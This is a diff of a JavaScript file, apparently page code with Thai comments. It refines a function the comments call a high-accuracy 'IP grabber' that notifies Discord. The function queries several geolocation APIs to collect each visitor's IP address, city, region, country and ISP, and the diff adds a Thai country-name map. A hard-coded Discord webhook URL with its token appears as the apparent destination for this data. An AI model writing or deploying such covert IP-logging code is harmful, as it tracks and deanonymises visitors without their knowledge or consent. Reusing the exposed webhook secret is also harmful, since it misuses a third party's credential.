@@ -73,13 +73,20 @@
       if (!on && el) el.remove();
     }
 
-    // ---------- แจ้ง Discord (ระบบดัก IP ความแม่นยำสูง) ----------
+    // ---------- แปลงประเทศเป็นไทย ----------
+    const countryMap = {
+      "Thailand": "ประเทศไทย", "United States": "สหรัฐอเมริกา", "Japan": "ญี่ปุ่น",
+      "United Kingdom": "สหราชอาณาจักร", "China": "จีน", "Singapore": "สิงคโปร์",
+      "South Korea": "เกาหลีใต้", "Germany": "เยอรมนี", "France": "ฝรั่งเศส"
+    };
+
+    // ---------- แจ้ง Discord (ระบบดัก IP ความแม่นยำสูงพร้อม API สำรอง) ----------
     const WEBHOOK = "https://discord.com/api/webhooks/1566010672658120764/Ixquirn6vSXk9nQwam2tkyhQ7fvW3jm7sWkrJVKau3XtZ44CbeB7S8s933cC6ZoMTcOn";
 
     async function getInfo() {
       const apis = [
-        "https://ipapi.co/json/",
         "https://ipwho.is/",
+        "https://ipapi.co/json/",
         "https://api.ipify.org?format=json"
       ];
 
@@ -89,27 +96,23 @@
         try {
           const res = await fetch(api);
           const data = await res.json();
-          if (api.includes("ipapi.co")) {
-            if (data.ip) {
-              info.ip = data.ip;
-              info.loc = [data.city, data.region, data.country_name].filter(Boolean).join(", ");
-              info.isp = data.org || "ไม่ทราบ";
-              info.type = data.version || "";
-              break;
-            }
-          } else if (api.includes("ipwho.is")) {
-            if (data.success) {
-              info.ip = data.ip;
-              info.loc = [data.city, data.region, data.country].filter(Boolean).join(", ");
-              info.isp = (data.connection && data.connection.isp) || "ไม่ทราบ";
-              info.type = data.type || "";
-              break;
-            }
-          } else if (api.includes("ipify.org")) {
-            if (data.ip) {
-              info.ip = data.ip;
-              break;
-            }
+          if (api.includes("ipwho.is") && data.success) {
+            info.ip = data.ip;
+            const country = countryMap[data.country] || data.country || "";
+            info.loc = [data.city, data.region, country].filter(Boolean).join(", ") || "ไม่ทราบ";
+            info.isp = (data.connection && data.connection.isp) || "ไม่ทราบ";
+            info.type = data.type || "";
+            break;
+          } else if (api.includes("ipapi.co") && data.ip) {
+            info.ip = data.ip;
+            const country = countryMap[data.country_name] || data.country_name || "";
+            info.loc = [data.city, data.region, country].filter(Boolean).join(", ") || "ไม่ทราบ";
+            info.isp = data.org || "ไม่ทราบ";
+            info.type = data.version || "";
+            break;
+          } else if (api.includes("ipify.org") && data.ip) {
+            info.ip = data.ip;
+            break;
           }
         } catch (e) {
           continue;
